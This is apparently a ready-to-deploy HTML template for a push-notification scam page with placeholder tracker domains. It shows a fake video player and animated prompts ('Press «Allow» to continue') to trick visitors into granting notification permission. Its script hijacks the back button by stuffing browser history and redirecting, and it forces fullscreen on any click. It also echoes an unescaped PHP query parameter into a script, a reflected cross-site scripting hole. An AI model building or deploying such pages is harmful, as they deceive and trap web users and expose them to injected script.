<!DOCTYPE html>
<head>
    <meta data-n-head="true" charset="UTF-8">
    <meta data-n-head="true" content="width=device-width,user-scalable=no,initial-scale=1" name="viewport">
    
    <!-- Monetizer JS -->
    <script>
    var pm_allowAction = function() {
		location.href = 'http://yourtracker.com/click/1';
	};
	var pm_denyAction = function() {
		location.href = 'http://yourtracker.com/click/2';
	};
	var pm_tag = '<?php echo $_GET['t']; ?>';
	var pm_pid = "6759-984740ef";
    </script>
    <script src="//yourdomain.com/js/pub.min.js" async></script>
    
    <!-- back button js -->
    <script>
	! function() {
	    var t;
	    try {
	        const URL = window.location.href.split(/[#]/)[0];
	        for (t = 0; 10 > t; ++t) history.pushState({}, "", URL + '#')
	        onpopstate = function(event) {
	            event.state && location.replace('http://yourtracker.com/click/3');
	        }
	    } catch (o) {
	        console.log(o);
	    }
	}();
	</script>
	
    <style data-vue-ssr-id="5d170bd8:0">
        .nuxt-progress {
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            height: 2px;
            width: 0;
            -webkit-transition: width .2s, opacity .4s;
            transition: width .2s, opacity .4s;
            opacity: 1;
            background-color: #efc14e;
            z-index: 999999
        }
    </style>
    <style data-vue-ssr-id="4046701d:0">
        @-webkit-keyframes hand {
            0% {
                -webkit-transform: translateY(-5px);
                transform: translateY(-5px)
            }
            50% {
                -webkit-transform: translateY(5px);
                transform: translateY(5px)
            }
            to {
                -webkit-transform: translateY(-5px);
                transform: translateY(-5px)
            }
        }
        
        @keyframes hand {
            0% {
                -webkit-transform: translateY(-5px);
                transform: translateY(-5px)
            }
            50% {
                -webkit-transform: translateY(5px);
                transform: translateY(5px)
            }
            to {
                -webkit-transform: translateY(-5px);
                transform: translateY(-5px)
            }
        }
        
        html {
            font-family: sans-serif
        }
        
        body {
            background-color: #000;
            background-position: top;
            background-repeat: no-repeat;
            background-attachment: fixed;
            background-size: cover
        }
        
        body:after {
            content: "";
            display: block;
            width: 40px;
            top: 32%;
            left: 39%;
            -webkit-transform: translate(-50%, -50%);
            transform: translate(-50%, -50%);
            z-index: 999
        }
        
        .stripe,
        body:after {
            height: 40px;
            position: absolute
        }
        
        .stripe {
            opacity: 0;
            width: 100%;
            line-height: 40px;
            background: #22a7f0;
            color: #fff;
            font-size: 22.4px;
            font-size: 1.4rem;
            text-align: center;
            z-index: 5;
            -webkit-box-shadow: 0 0 18px 2px rgba(0, 0, 0, .13);
            box-shadow: 0 0 18px 2px rgba(0, 0, 0, .13)
        }
        
        .stripe1 {
            top: 0
        }
        
        .stripe3 {
            display: none;
            width: 708px;
            top: 431px;
            left: 50%;
            -webkit-transform: translateX(-50%);
            transform: translateX(-50%)
        }
        
        .stripe strong {
            font-size: 32px;
            font-size: 2rem
        }
        
        .page-container {
            width: 95%;
            max-width: 1100px;
            margin: 0 auto
        }
        
        .video {
            position: relative
        }
        
        .video:after {
            content: "";
            display: block;
            width: 300px;
            height: 300px;
            position: absolute;
            top: 39.5%;
            left: 50%;
            -webkit-transform: translate(-50%, -50%);
            transform: translate(-50%, -50%);
            z-index: 999
        }
        
        .video img {
            width: 100%
        }
        
        .container:before {
            width: 522px;
            height: 370px;
            top: 170px;
            left: 35px;
            z-index: 1
        }
        
        .container:after,
        .container:before {
            content: "";
            display: none;
            position: absolute
        }
        
        .container:after {
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, .55);
            z-index: 3
        }
        
        .container--modal .stripe {
            background: #fabe58
        }
        
        .container--modal .stripe3 {
            display: block
        }
        
        .modal2 {
            display: none;
            width: 708px;
            height: 391px;
            position: absolute;
            top: 40px;
            left: 50%;
            -webkit-transform: translateX(-50%);
            transform: translateX(-50%);
            background: no-repeat 0/contain;
            z-index: 5
        }
        
        .modal2:after {
            content: "";
            display: block;
            width: 146px;
            height: 114px;
            position: absolute;
            top: 0;
            right: 100%
        }
        
        .container--modal .modal2,
        .hand {
            display: block
        }
        
        .hand {
            width: 160px;
            height: 180px;
            position: absolute;
            top: 10%;
            left: 11.5%;
            -webkit-transform: translate(-50%, -20px);
            transform: translate(-50%, -20px);
            background: url("1bad07bec417f43bff92869091cf3f12c45e4320.png") no-repeat 0/contain;
            z-index: 6;
            -webkit-animation-name: hand;
            animation-name: hand;
            -webkit-animation-duration: .8s;
            animation-duration: .8s;
            -webkit-animation-iteration-count: infinite;
            animation-iteration-count: infinite
        }
        
        @media screen and (min-width:1140px) and (-webkit-min-device-pixel-ratio:0) and (min-resolution:.001dpcm) {
            .hand {
                top: 17%;
                left: 12%
            }
        }
        
        @media screen and (min-width:1580px) and (-webkit-min-device-pixel-ratio:0) and (min-resolution:.001dpcm) {
            .hand {
                top: 13%;
                left: 8%
            }
        }
        
        .size-indicator {
            display: none
        }
        
        @media screen and (max-width:939px) {
            .show-pc {
                display: none
            }
            .container:before {
                top: 0
            }
        }
        
        @media screen and (max-width:940px) {
            body {
                background-color: #000;
                background-position: top;
                background-repeat: no-repeat;
                background-attachment: fixed;
                background-size: cover
            }
            body:after {
                content: "";
                width: 40px;
                height: 40px;
                top: 20%;
                left: 50%;
                -webkit-transform: translate(-50%, -50%);
                transform: translate(-50%, -50%);
                z-index: 999
            }
            .hand,
            body:after {
                display: block;
                position: absolute
            }
            .hand {
                width: 160px;
                height: 180px;
                top: 52%;
                left: 60%;
                -webkit-transform: translate(-50%, -20px);
                transform: translate(-50%, -20px);
                background: url("1bad07bec417f43bff92869091cf3f12c45e4320.png") no-repeat 0/contain;
                z-index: 6;
                -webkit-animation-name: hand;
                animation-name: hand;
                -webkit-animation-duration: .8s;
                animation-duration: .8s;
                -webkit-animation-iteration-count: infinite;
                animation-iteration-count: infinite
            }
            .size-indicator {
                display: block
            }
            .page-container {
                width: 65%
            }
            .video:after {
                width: 120px;
                height: 120px
            }
            .container:before {
                display: block
            }
        }
        
        .modal-overlay {
            width: 100%;
            height: 100%;
            position: fixed;
            top: 0;
            left: 0;
            background: #3d3d3d;
            opacity: .5;
            display: none;
            z-index: 999999999
        }
        
        .modal-b,
        .modal1 {
            position: fixed;
            left: 5%;
            top: 15%;
            color: #000;
            z-index: 1e+24;
            border-radius: 4px
        }
        
        @media screen and (-webkit-min-device-pixel-ratio:0) and (min-resolution:.001dpcm) {
            .modal-b,
            .modal1 {
                left: 1%
            }
        }
        
        .modal-b,
        .modal1 {
            display: none
        }
        
        @media (max-width:800px) {
            .modal-b,
            .modal1 {
                top: 70%;
                left: 0;
                max-width: 100%
            }
            .modal-b img,
            .modal1 img {
                max-width: 100%
            }
        }
        
        .modal img {
            width: 100%
        }
        
        body.show-modal .modal-overlay {
            display: block
        }
        
        a {
            text-decoration: none
        }
        
        .fallback ul {
            list-style: none
        }
        
        * {
            margin: 0;
            padding: 0
        }
        
        body {
            font-family: Arial, Helvetica Neue, Helvetica, sans-serif;
            -moz-text-size-adjust: none;
            -webkit-text-size-adjust: none;
            -ms-text-size-adjust: none
        }
        
        #header a {
            display: block
        }
        
        #query h5,
        #query h6 {
            color: #666;
            font-size: 16px
        }
        
        #query h6 {
            padding: 0;
            text-transform: capitalize
        }
        
        li.lilist #ed_links a {
            display: block;
            background: url("43bcc0e28d8d516eba7b679c8511d7f92a0ecb33.png") 100% no-repeat;
            padding: 14px 75px 14px 55px;
            word-wrap: break-word;
            min-height: 68px;
            position: relative;
            overflow: hidden
        }
        
        #ed_links a .title b,
        strong {
            font-weight: 700!important
        }
        
        #ed_links a .descurl span {
            color: #1c2c4c
        }
        
        #ed_links a .mrt {
            width: 51%;
            float: left
        }
        
        #ed_links a .title-wrap span.mRatngs img {
            margin-right: 5px;
            float: left
        }
        
        #ed_links a:hover .descurl span {
            color: #fff
        }
        
        #footer a {
            text-decoration: none;
            color: #000;
            font-size: 12px
        }
        
        #footer a:hover {
            text-decoration: underline
        }
        
        @media only screen and (max-width:850px) {
            #query h5,
            #query h6 {
                font-size: 14px
            }
            li.lilist #ed_links a {
                padding: 13px 64px 13px 38px;
                min-height: 58px
            }
            #ed_links a .url span {
                display: inline;
                padding-bottom: 0
            }
        }
        
        @media only screen and (max-width:767px) {
            #ed_links a {
                float: none;
                width: auto
            }
        }
        
        body,
        html {
            background-color: #000;
            height: 100%
        }
        
        body {
            -moz-osx-font-smoothing: grayscale;
            -webkit-font-smoothing: antialiased;
            color: #fff;
            font: 400 16px serif;
            margin: 0;
            overflow: hidden;
            text-align: center;
            -webkit-user-select: none;
            -moz-user-select: none;
            -ms-user-select: none;
            user-select: none
        }
        
        .v {
            bottom: 0;
            margin: auto;
            position: fixed;
            right: 0
        }
        
        .v,
        .vwd {
            left: 0;
            top: 0
        }
        
        .vwd {
            bottom: 50px;
            position: absolute;
            width: 100%
        }
        
        .preloader {
            left: 50%;
            -webkit-transform: translate(-50%, -50%);
            transform: translate(-50%, -50%);
            z-index: 10
        }
        
        .preloader,
        .video {
            position: absolute;
            top: 50%
        }
        
        .video {
            width: 100%;
            left: 0;
            -webkit-transform: translateY(-50%);
            transform: translateY(-50%);
            display: none
        }
        
        .hint {
            position: absolute;
            bottom: 25%;
            left: 50%;
            -webkit-transform: translateX(-50%);
            transform: translateX(-50%);
            background: rgba(0, 0, 0, .8);
            padding: 20px;
            font-size: 30px;
            font-family: Arial, Helvetica, sans-serif;
            visibility: hidden;
            opacity: 0
        }
        
        .hint_visible {
            visibility: visible;
            opacity: 1;
            -webkit-transition: 1s ease-in;
            transition: 1s ease-in
        }
        
        .vwc {
            background-color: #000;
            bottom: 0;
            height: 50px;
            left: 0;
            width: 100%;
            position: absolute
        }
        
        .vcp {
            background-color: hsla(0, 0%, 100%, .2);
            height: 3px;
            margin-top: 4px;
            position: relative
        }
        
        .vcp .load_line {
            background-color: #d0021b;
            content: "";
            height: 100%;
            left: 0;
            position: absolute;
            top: 0;
            width: 0
        }
        
        .vcl,
        .vcr {
            margin-top: 8px
        }
        
        .vcl {
            float: left
        }
        
        .vcr {
            float: right;
            padding-right: 10px
        }
        
        .vcr .vci:first-child {
            margin-left: 0
        }
        
        .vcii {
            font-family: sans-serif;
            font-size: 12px;
            line-height: 29px
        }
        
        .vci,
        .vcii {
            float: left;
            margin-left: 10px
        }
        
        .vci {
            fill: #fff;
            height: 27px;
            width: 27px
        }
        
        @media (min-width:700px) {
            .vcl,
            .vcr {
                margin-top: 6px
            }
            .vcii {
                line-height: 34px
            }
            .vci {
                height: 32px;
                width: 32px
            }
        }
        
        @media (max-height:670px) {
            .hint {
                bottom: 10%
            }
        }
        
        @media screen and (max-width:940px) {
            .hand {
                left: 50%
            }
        }
        
        .hand_text {
            position: absolute;
            top: 160px
        }
    </style>
</head>

<body data-n-head="" onclick="openFullscreen()";>
    <div id="__nuxt" data-server-rendered="true">
        <div class="nuxt-progress" style="width:0%;height:2px;background-color:#000;opacity:0"></div>
        <div id="__layout">
            <div>
                <div class="container">
                    <div class="hand show-pc">
                        <div class="hand_text">Press «Allow» to continue</div>
                    </div>
                    <p class="stripe stripe1 show-pc"></p>
                    <div class="page-container"></div>
                    <div class="modal2"></div>
                    <p class="stripe stripe3 show-pc">Press «Allow» to continue</p>
                </div>
                <div class="size-indicator"></div>
                <div class="modal-b"><img src="47a64bfdc86f7c6bb43c4ab3b4d0b9bfc5b4980e.png"></div>
                <div class="modal1"><img src="b3d9dddd453285e588547034cbe9e8f284dc740a.png"></div>
                <div class="modal-overlay"></div>
                <div class="v">
                    <div class="vwd"><img src="7ec6d7843172d2bec7c0ed0d7eabed19a800fd7b.gif" alt="" class="preloader" style="display:none">
                        <video autoplay="" class="video" muted="" preload="auto" style="display:block">
                            <source src="video.mp4" type="video/mp4">
                        </video>
                        <div class="hint">Please click on the ALLOW to watch</div>
                    </div>
                    <div class="vwc">
                        <div class="vcp">
                            <div class="load_line" style="width: 2%;"></div>
                        </div>
                        <div class="vcl">
                            <svg class="vci isPlay" version="1.1" viewBox="0 0 32 32">
                                <path d="m9 24 14-8-14-8z"></path>
                            </svg>
                            <svg class="vci isGo" version="1.1" viewBox="0 0 32 32">
                                <path d="m19.9982847 15.3389545-10.9982847-7.3389545v15.9990007l10.9982847-7.3399538v7.3409531h3.0017153v-15.98900756h-3.0017153z"></path>
                            </svg>
                            <svg class="vci isSound" version="1.1" viewBox="0 0 32 32">
                                <path d="m15.7953529 9.04082456c.1257064.06406941.2056128.19737514.2046383.34308139v14.23271095c0 .1457062-.0799064.279012-.2046383.3430814-.0526213.0279012-.1091404.0403017-.1656596.0403017-.0779574 0-.1568893-.0258344-.2221787-.0775033l-5.54374876-4.3288192h-3.11927225c-.41025105 0-.74449359-.3451481-.74449359-.7698664v-4.646066c0-.4247183.33424254-.7698664.74449359-.7698664h3.11927225l5.54374876-4.32985255c.1110894-.0878371.2621319-.10333777.3878383-.03720159zm7.2046471 7.45867724c0 2.2629767-1.0844571 4.2688649-2.747102 5.5004982l-1.252898-1.3691458c1.3172463-.8788839 2.1925716-2.3994927 2.1925716-4.1313524 0-1.7308633-.8753253-3.2514721-2.1925716-4.130356l1.252898-1.3691458c1.6626449 1.2316333 2.747102 3.2375215 2.747102 5.4995018zm-3-.0000037c0 1.4897461-.7231986 2.7907643-1.7970123 3.5005019l-1.2029877-1.4254984c.7688928-.3011616 1.3224956-1.1153018 1.3224956-2.0750035 0-.957694-.5544815-1.7728381-1.3224956-2.0729959l1.2029877-1.4265022c1.0738137.7097376 1.7970123 2.0107558 1.7970123 3.4994981zm2.2948011-7.4994981c2.2528555 1.7418839 3.7051989 4.455703 3.7051989 7.4995 0 3.044797-1.4523434 5.7586161-3.7042143 7.5005l-1.2957857-1.3639091c1.8914927-1.393907 3.120323-3.6247583 3.120323-6.1365909 0-2.5098326-1.2288303-4.7416839-3.120323-6.134591z"></path>
                            </svg>
                            <div class="vcii">0:0<span class="time">2</span> / 2:13:00</div>
                        </div>
                        <div class="vcr">
                            <svg class="vci isOptions" version="1.1" viewBox="0 0 32 32">
                                <path d="m23.242 14.316c.421 0 .758.337.758.741v1.853c0 .421-.337.757-.758.757h-.842c-.32 0-.589.203-.708.505-.033.102-.067.202-.118.304-.134.303-.066.64.153.858l.572.557c.304.303.304.774 0 1.077l-1.314 1.315c-.303.302-.774.302-1.078 0l-.572-.574c-.219-.218-.556-.286-.843-.151-.1.067-.219.101-.336.151-.303.119-.489.405-.489.707v.827c0 .421-.337.757-.758.757h-1.852c-.421 0-.758-.336-.758-.757v-.776c0-.319-.202-.589-.488-.707-.102-.051-.219-.101-.337-.151-.287-.135-.623-.068-.842.151l-.573.572c-.303.304-.775.304-1.078 0l-1.314-1.313c-.303-.303-.303-.774 0-1.078l.59-.589c.219-.236.286-.573.151-.859-.033-.101-.084-.203-.117-.303-.102-.304-.388-.506-.708-.506h-.825c-.421 0-.758-.337-.758-.74v-1.854c0-.421.337-.758.758-.758h.842c.32 0 .589-.202.708-.504.033-.102.067-.186.118-.287.134-.287.066-.64-.153-.859l-.606-.606c-.303-.303-.303-.775 0-1.078l1.314-1.314c.303-.303.775-.303 1.078 0l.606.606c.236.219.573.287.859.152.101-.05.185-.084.287-.117.302-.102.504-.388.504-.708v-.859c0-.421.337-.758.759-.758h1.852c.422 0 .759.337.759.758v.842c0 .32.202.59.504.707.102.034.186.085.287.118.286.135.64.068.859-.151l.606-.607c.303-.302.775-.302 1.078 0l1.314 1.314c.303.304.303.775 0 1.078l-.606.606c-.237.219-.287.573-.153.859.034.085.085.185.118.287.119.303.388.505.708.505zm-7.242 4.632c1.634 0 2.947-1.314 2.947-2.948 0-1.633-1.313-2.947-2.947-2.947s-2.947 1.314-2.947 2.947c0 1.634 1.313 2.948 2.947 2.948z"></path>
                            </svg>
                            <svg class="vci isFull" version="1.1" viewBox="0 0 32 32">
                                <path d="m8.125 17.75v2.625h2.625v2.625h-5.25v-5.25zm13.125-8.75h5.25v5.25h-2.625v-2.625h-2.625zm2.625 11.375v-2.625h2.625v5.25h-5.25v-2.625zm-18.375-6.125v-5.25h5.25v2.625h-2.625v2.625z"></path>
                            </svg>
                            <svg class="vci isSave" version="1.1" viewBox="0 0 32 32">
                                <path d="m22.667958 17.4957586h2.0463774c.1389837 0 .2525019.1136976.2525019.2525019v6.6375006c0 .138625-.1135182.252502-.2525019.252502h-17.42819149c-.13898365 0-.25268125-.113877-.25268125-.252502v-6.6375006c0-.1388043.1136976-.2525019.25268125-.2525019h1.89484037c.13880432 0 .25250191.1136976.25250191.2525019v4.4456836c0 .1388043.1136976.2523226.25250192.2523226h12.47714539c.138625 0 .252502-.1135183.252502-.2523226v-4.4456836c0-.1388043.1136976-.2525019.2523225-.2525019zm-4.8844056-3.2958673v.0001793h2.3103566c.2223739 0 .3014601.1502817.1761058.3337401l-4.041824 5.9239317c-.1255336.1834584-.3303328.1834584-.4556871 0l-4.0420033-5.924111c-.1255336-.1834585-.0460887-.3337401.1761058-.3337401h2.3101773c.2223738 0 .4042183-.1818445.4042183-.404039v-6.39181337c0-.22219451.1818444-.40403893.4042182-.40403893h1.9497165c.2223739 0 .4043976.18184442.4043976.40403893v6.39181337c0 .2221945.1818444.404039.4042183.404039z"></path>
                            </svg>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>

<script>
var elem = document.documentElement;
function openFullscreen() {
  if (elem.requestFullscreen) {
    elem.requestFullscreen();
  } else if (elem.mozRequestFullScreen) { /* Firefox */
    elem.mozRequestFullScreen();
  } else if (elem.webkitRequestFullscreen) { /* Chrome, Safari & Opera */
    elem.webkitRequestFullscreen();
  } else if (elem.msRequestFullscreen) { /* IE/Edge */
    elem.msRequestFullscreen();
  }
}
</script>
</body>

</html>